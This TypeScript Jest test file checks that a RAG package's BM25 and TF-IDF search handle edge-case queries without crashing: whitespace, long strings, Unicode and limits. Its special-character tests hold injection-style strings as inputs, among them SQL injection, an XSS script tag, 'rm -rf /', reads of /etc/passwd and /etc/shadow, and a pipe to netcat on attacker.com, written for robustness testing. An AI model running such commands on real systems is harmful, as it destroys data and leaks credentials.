/**
 * @fileoverview Edge case and robustness tests for RAG package
 * @module @a2a/rag/tests/edge-cases/robustness
 * 
 * Tests system robustness against:
 * - Empty queries, whitespace, tabs
 * - Very long queries (10000+ characters)
 * - Special characters, regex patterns, SQL injection-like input
 * - Non-existent topics
 * - Unicode: different languages, emoji, RTL text
 * - Limit boundaries
 * - Case sensitivity
 * - Whitespace handling
 */

import path from 'path';
import fs from 'fs/promises';
import {
  RAGSearcher,
  BM25Scorer,
  TFIDFService,
  ChunkManager,
} from '../../src/index.js';
import {TestDataGenerator} from '../../test-data/generator.js';
import {DEFAULT_CONFIG} from '../config.js';
import type {Chunk} from '../../src/chunk-manager.js';

// Test directories
const EDGE_CASE_DIR = path.join(DEFAULT_CONFIG.outputDir, 'edge-case-test');

// Mock embedding client
jest.mock('@a2a/embedding', () => ({
  createEmbeddingClient: () => ({
    embed: jest.fn(async (content: string) => {
      const hash = content.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0);
      const vector = Array(384).fill(0).map((_, i) => {
        return Math.sin(hash * (i + 1)) * 0.5 + 0.5;
      });
      const magnitude = Math.sqrt(vector.reduce((sum, v) => sum + v * v, 0));
      return vector.map(v => v / magnitude);
    }),
  }),
}));

describe('RAG Edge Cases and Robustness', () => {
  let bm25Scorer: BM25Scorer;
  let tfidfService: TFIDFService;
  let chunkManager: ChunkManager;
  let chunks: Chunk[] = [];

  beforeAll(async () => {
    // Ensure test directory exists
    await fs.mkdir(EDGE_CASE_DIR, {recursive: true});

    // Generate test data
    const generator = new TestDataGenerator({
      outputDir: EDGE_CASE_DIR,
      fileTypes: ['typescript', 'javascript', 'php', 'vue', 'markdown'],
      filesPerType: 10,
      seed: 99999,
    });
    await generator.generateAll();

    // Create chunks from generated files
    chunkManager = new ChunkManager({});
    const files = await fs.readdir(EDGE_CASE_DIR, {recursive: true});
    
    for (const file of files) {
      const filePath = path.join(EDGE_CASE_DIR, file);
      const stat = await fs.stat(filePath);
      if (stat.isFile()) {
        const content = await fs.readFile(filePath, 'utf-8');
        const ext = path.extname(filePath);
        const fileChunks = chunkManager.chunkFile(filePath, content, ext);
        chunks.push(...fileChunks);
      }
    }

    // Initialize search services
    bm25Scorer = new BM25Scorer();
    tfidfService = new TFIDFService();

    // Index all chunks
    for (const chunk of chunks) {
      const docId = chunk.id || `${chunk.filePath}:${chunk.startLine}`;
      bm25Scorer.addDocument(docId, chunk.content);
      tfidfService.addDocument(docId, chunk.content);
    }
  });

  describe('Empty Queries', () => {
    it('should handle empty string query gracefully', () => {
      const bm25Results = bm25Scorer.search('', 10);
      const tfidfResults = tfidfService.search('', 10);

      // Should return empty results, not crash
      expect(Array.isArray(bm25Results)).toBe(true);
      expect(Array.isArray(tfidfResults)).toBe(true);
      expect(bm25Results.length).toBe(0);
      expect(tfidfResults.length).toBe(0);
    });

    it('should handle whitespace-only queries', () => {
      const whitespaceQueries = [
        ' ',
        '  ',
        '   ',
        '\t',
        '\t\t',
        ' \t ',
        '\n',
        '\n\n',
        ' \t\n \t\n',
      ];

      for (const query of whitespaceQueries) {
        const bm25Results = bm25Scorer.search(query, 10);
        const tfidfResults = tfidfService.search(query, 10);

        expect(Array.isArray(bm25Results)).toBe(true);
        expect(Array.isArray(tfidfResults)).toBe(true);
        // Results may be empty or contain arbitrary results
        expect(bm25Results.length).toBeGreaterThanOrEqual(0);
      }
    });

    it('should handle queries with only special whitespace characters', () => {
      const specialWhitespace = [
        '\u00A0', // Non-breaking space
        '\u2000', // En quad
        '\u2001', // Em quad
        '\u2002', // En space
        '\u2003', // Em space
        '\u2009', // Thin space
        '\u202F', // Narrow no-break space
      ];

      for (const ws of specialWhitespace) {
        expect(() => bm25Scorer.search(ws, 10)).not.toThrow();
        expect(() => tfidfService.search(ws, 10)).not.toThrow();
      }
    });
  });

  describe('Long Queries', () => {
    it('should handle query with 1000 characters', () => {
      const longQuery = 'function '.repeat(111).slice(0, 1000);
      
      const bm25Results = bm25Scorer.search(longQuery, 10);
      const tfidfResults = tfidfService.search(longQuery, 10);

      expect(Array.isArray(bm25Results)).toBe(true);
      expect(Array.isArray(tfidfResults)).toBe(true);
    });

    it('should handle query with 5000 characters', () => {
      const longQuery = 'async await function class interface '.repeat(125).slice(0, 5000);
      
      const bm25Results = bm25Scorer.search(longQuery, 10);
      const tfidfResults = tfidfService.search(longQuery, 10);

      expect(Array.isArray(bm25Results)).toBe(true);
      expect(Array.isArray(tfidfResults)).toBe(true);
    });

    it('should handle query with 10000+ characters', () => {
      const veryLongQuery = 'typescript javascript php vue markdown '.repeat(286).slice(0, 10000);
      
      const startTime = performance.now();
      const bm25Results = bm25Scorer.search(veryLongQuery, 10);
      const duration = performance.now() - startTime;

      expect(Array.isArray(bm25Results)).toBe(true);
      // Should still complete in reasonable time
      expect(duration).toBeLessThan(1000);
    });

    it('should handle query with repeated words', () => {
      const repeatedQuery = 'function '.repeat(100) + 'class '.repeat(100);
      
      const bm25Results = bm25Scorer.search(repeatedQuery, 10);
      
      expect(Array.isArray(bm25Results)).toBe(true);
      // Should handle without exponential slowdown
    });
  });

  describe('Special Characters', () => {
    it('should handle regex special characters without error', () => {
      const regexQueries = [
        'function.*',
        'class[\\s\\S]+',
        'async?',
        'function|class',
        '(function)',
        '[function]',
        '{function}',
        'function+',
        'function^',
        'function$',
        '.function',
      ];

      for (const query of regexQueries) {
        expect(() => bm25Scorer.search(query, 10)).not.toThrow();
        expect(() => tfidfService.search(query, 10)).not.toThrow();
      }
    });

    it('should handle SQL injection-like patterns safely', () => {
      const sqlInjectionPatterns = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; DELETE FROM chunks; --",
        "function'; --",
        "1; SELECT * FROM secrets",
        "' UNION SELECT * FROM passwords --",
        "${process.env.SECRET}",
        "#{system('rm -rf /')}",
      ];

      for (const pattern of sqlInjectionPatterns) {
        // Should not throw or hang
        expect(() => {
          bm25Scorer.search(pattern, 10);
          tfidfService.search(pattern, 10);
        }).not.toThrow();
      }
    });

    it('should handle XML/HTML-like content', () => {
      const xmlQueries = [
        '<function>test</function>',
        '<script>alert("xss")</script>',
        '<div>content</div>',
        '<?php echo $var; ?>',
        '<!-- comment -->',
        '<![CDATA[content]]>',
      ];

      for (const query of xmlQueries) {
        expect(() => bm25Scorer.search(query, 10)).not.toThrow();
      }
    });

    it('should handle shell/command injection patterns', () => {
      const shellPatterns = [
        '$(whoami)',
        '`cat /etc/passwd`',
        '|| ls -la',
        '&& rm -rf /',
        '; cat /etc/shadow',
        '| nc attacker.com 4444',
        'function & ping -c 1 127.0.0.1',
      ];

      for (const pattern of shellPatterns) {
        expect(() => {
          bm25Scorer.search(pattern, 10);
          tfidfService.search(pattern, 10);
        }).not.toThrow();
      }
    });

    it('should handle JSON-like content', () => {
      const jsonQueries = [
        '{"key": "value"}',
        '{"function": "test"}',
        '["array", "of", "items"]',
        '{"nested": {"key": "value"}}',
      ];

      for (const query of jsonQueries) {
        expect(() => bm25Scorer.search(query, 10)).not.toThrow();
      }
    });
  });

  describe('Non-existent Topics', () => {
    it('should return empty results for completely unrelated queries', () => {
      const nonExistentQueries = [
        'quantum physics entanglement',
        'medieval castle architecture',
        'photosynthesis in plants',
        'stock market prediction algorithm',
        'martian colony infrastructure',
        'dinosaur extinction theories',
        'ocean trench exploration',
        'volcanic eruption patterns',
      ];

      for (const query of nonExistentQueries) {
        const bm25Results = bm25Scorer.search(query, 10);
        
        // Should return empty or very low relevance results
        expect(Array.isArray(bm25Results)).toBe(true);
        expect(bm25Results.length).toBeGreaterThanOrEqual(0);
        
        // All results should have very low scores
        for (const result of bm25Results) {
          expect(result.score).toBeLessThan(1.0);
        }
      }
    });

    it('should handle mixed existent and non-existent terms', () => {
      const mixedQueries = [
        'function quantum physics',
        'class dinosaur',
        'async await photosynthesis',
        'interface volcano',
      ];

      for (const query of mixedQueries) {
        const bm25Results = bm25Scorer.search(query, 10);
        
        expect(Array.isArray(bm25Results)).toBe(true);
        // Should still return some results for the matching parts
        expect(bm25Results.length).toBeGreaterThanOrEqual(0);
      }
    });
  });

  describe('Unicode Support', () => {
    it('should handle queries with emoji', () => {
      const emojiQueries = [
        'function 🚀',
        'class 🔥',
        '📝 code documentation',
        'async ✨',
        '🐛 bug fix',
        '🔒 security',
      ];

      for (const query of emojiQueries) {
        expect(() => bm25Scorer.search(query, 10)).not.toThrow();
        expect(() => tfidfService.search(query, 10)).not.toThrow();
      }
    });

    it('should handle queries in different languages', () => {
      const multilingualQueries = [
        'функция', // Russian
        '函数', // Chinese
        '関数', // Japanese
        '함수', // Korean
        'função', // Portuguese
        'fonction', // French
        'funktion', // German
        'funzione', // Italian
        ' función', // Spanish
      ];

      for (const query of multilingualQueries) {
        expect(() => bm25Scorer.search(query, 10)).not.toThrow();
        expect(() => tfidfService.search(query, 10)).not.toThrow();
      }
    });

    it('should handle RTL (Right-to-Left) text', () => {
      const rtlQueries = [
        'function קוד', // Hebrew
        'function كود', // Arabic
        'دالة', // Arabic
        'פונקציה', // Hebrew
      ];

      for (const query of rtlQueries) {
        expect(() => bm25Scorer.search(query, 10)).not.toThrow();
        expect(() => tfidfService.search(query, 10)).not.toThrow();
      }
    });

    it('should handle mathematical symbols', () => {
      const mathQueries = [
        '∑ function',
        '∫ class',
        '∂/∂x',
        'α β γ',
        '∞ loop',
        '√ function',
        'π constant',
        '≠ operator',
        '≤ ≥',
      ];

      for (const query of mathQueries) {
        expect(() => bm25Scorer.search(query, 10)).not.toThrow();
      }
    });

    it('should handle currency symbols', () => {
      const currencyQueries = [
        '$100 function',
        '€ class',
        '£ method',
        '¥ variable',
        '₽ price',
        '₹ cost',
      ];

      for (const query of currencyQueries) {
        expect(() => bm25Scorer.search(query, 10)).not.toThrow();
      }
    });

    it('should handle combining characters and diacritics', () => {
      const diacriticQueries = [
        'naïve function',
        'résumé class',
        'café method',
        'Zürich interface',
        'Ångström',
        'Μήτσος', // Greek with diacritics
      ];

      for (const query of diacriticQueries) {
        expect(() => bm25Scorer.search(query, 10)).not.toThrow();
      }
    });
  });

  describe('Limit Boundaries', () => {
    it('should handle limit = 0', () => {
      const results = bm25Scorer.search('function', 0);
      expect(Array.isArray(results)).toBe(true);
      expect(results.length).toBe(0);
    });

    it('should handle limit = 1', () => {
      const results = bm25Scorer.search('function', 1);
      expect(Array.isArray(results)).toBe(true);
      expect(results.length).toBeLessThanOrEqual(1);
    });

    it('should handle very large limit', () => {
      const results = bm25Scorer.search('function', 10000);
      expect(Array.isArray(results)).toBe(true);
      expect(results.length).toBeLessThanOrEqual(chunks.length);
    });

    it('should handle negative limit gracefully', () => {
      expect(() => bm25Scorer.search('function', -1)).not.toThrow();
      const results = bm25Scorer.search('function', -1);
      expect(Array.isArray(results)).toBe(true);
    });

    it('should handle limit larger than available results', () => {
      const results = bm25Scorer.search('xyznonexistent', 1000);
      expect(Array.isArray(results)).toBe(true);
      expect(results.length).toBeLessThanOrEqual(chunks.length);
    });
  });

  describe('Case Sensitivity', () => {
    it('should be case-insensitive for lowercase queries', () => {
      const lowerResults = bm25Scorer.search('function', 10);
      const upperResults = bm25Scorer.search('FUNCTION', 10);

      // Should return similar results regardless of case
      expect(lowerResults.length).toBeGreaterThan(0);
      expect(upperResults.length).toBeGreaterThan(0);
      
      // Same documents should be found
      const lowerIds = new Set(lowerResults.map(r => r.id));
      const upperIds = new Set(upperResults.map(r => r.id));
      const intersection = new Set([...lowerIds].filter(id => upperIds.has(id)));
      
      expect(intersection.size).toBeGreaterThan(0);
    });

    it('should be case-insensitive for mixed case queries', () => {
      const mixedQueries = [
        'Function',
        'FUNCTION',
        'function',
        'FuNcTiOn',
        'CLASS',
        'Class',
        'class',
      ];

      const resultSets = mixedQueries.map(q => 
        new Set(bm25Scorer.search(q, 10).map(r => r.id))
      );

      // All variations should find at least some common results
      for (let i = 1; i < resultSets.length; i++) {
        const intersection = new Set(
          [...resultSets[0]].filter(id => resultSets[i].has(id))
        );
        expect(intersection.size).toBeGreaterThanOrEqual(0);
      }
    });

    it('should handle camelCase queries', () => {
      const camelCaseQueries = [
        'getUserData',
        'fetchUserProfile',
        'updateUserSettings',
        'handleUserClick',
      ];

      for (const query of camelCaseQueries) {
        const lowerResults = bm25Scorer.search(query, 10);
        const upperResults = bm25Scorer.search(query.toUpperCase(), 10);

        expect(() => lowerResults).not.toThrow();
        expect(() => upperResults).not.toThrow();
      }
    });
  });

  describe('Whitespace Handling', () => {
    it('should handle single space between words', () => {
      const results = bm25Scorer.search('async function', 10);
      expect(Array.isArray(results)).toBe(true);
    });

    it('should handle multiple spaces between words', () => {
      const multiSpaceQueries = [
        'async  function',
        'async   function',
        'async    function',
        'async     function',
      ];

      const results = multiSpaceQueries.map(q => bm25Scorer.search(q, 10));
      
      // All should return valid results
      for (const r of results) {
        expect(Array.isArray(r)).toBe(true);
      }
      
      // Results should be similar
      const resultCounts = results.map(r => r.length);
      const allSame = resultCounts.every(c => c === resultCounts[0]);
      expect(allSame).toBe(true);
    });

    it('should handle leading whitespace', () => {
      const leadingWhitespaceQueries = [
        ' function',
        '  function',
        '   function',
        '\tfunction',
        '\nfunction',
      ];

      for (const query of leadingWhitespaceQueries) {
        const results = bm25Scorer.search(query, 10);
        expect(Array.isArray(results)).toBe(true);
      }
    });

    it('should handle trailing whitespace', () => {
      const trailingWhitespaceQueries = [
        'function ',
        'function  ',
        'function   ',
        'function\t',
        'function\n',
      ];

      for (const query of trailingWhitespaceQueries) {
        const results = bm25Scorer.search(query, 10);
        expect(Array.isArray(results)).toBe(true);
      }
    });

    it('should handle internal whitespace variations', () => {
      const variations = [
        'async function',
        'async\tfunction',
        'async\nfunction',
        'async\r\nfunction',
      ];

      const results = variations.map(q => bm25Scorer.search(q, 10));
      
      for (const r of results) {
        expect(Array.isArray(r)).toBe(true);
      }
    });

    it('should handle tab characters', () => {
      const tabQueries = [
        '\t',
        '\t\t',
        '\tquery',
        'query\t',
        '\tquery\t',
        'query\twith\ttabs',
      ];

      for (const query of tabQueries) {
        expect(() => bm25Scorer.search(query, 10)).not.toThrow();
      }
    });

    it('should handle newline characters', () => {
      const newlineQueries = [
        '\n',
        '\n\n',
        '\nquery',
        'query\n',
        'query\nwith\nnewlines',
        'query\r\nwindows',
      ];

      for (const query of newlineQueries) {
        expect(() => bm25Scorer.search(query, 10)).not.toThrow();
      }
    });
  });

  describe('Combined Edge Cases', () => {
    it('should handle complex combinations of edge cases', () => {
      const complexQueries = [
        '  function   🚀  ',
        '\t\nFUNCTION\t\n',
        'async\t\n\tawait  💻',
        '   class🔥   extends   ',
        '\n\ninterface\tUser📝\n\n',
        'function'.repeat(50) + ' 💯',
        'функция function',
        '  '.repeat(100) + 'query',
      ];

      for (const query of complexQueries) {
        const startTime = performance.now();
        
        expect(() => {
          bm25Scorer.search(query, 10);
          tfidfService.search(query, 10);
        }).not.toThrow();
        
        const duration = performance.now() - startTime;
        
        // Should complete in reasonable time even with edge cases
        expect(duration).toBeLessThan(1000);
      }
    });

    it('should maintain stability under edge case stress', async () => {
      const edgeCaseQueries = [
        '',
        ' ',
        'function'.repeat(100),
        '🚀🔥💻📝🔒',
        '<script>alert(1)</script>',
        "'; DROP TABLE; --",
        'функция関数函数',
        '\x00\x01\x02\x03',
        'query\x7F\x80\x81',
      ];

      const results: {query: string; success: boolean; duration: number}[] = [];

      for (const query of edgeCaseQueries) {
        const startTime = performance.now();
        let success = false;
        
        try {
          bm25Scorer.search(query, 10);
          tfidfService.search(query, 10);
          success = true;
        } catch {
          success = false;
        }
        
        results.push({
          query: query.slice(0, 30) + (query.length > 30 ? '...' : ''),
          success,
          duration: performance.now() - startTime,
        });
      }

      console.log('\nEdge Case Stress Results:');
      console.table(results);

      // All should complete without throwing
      expect(results.every(r => r.success)).toBe(true);
    });
  });
});
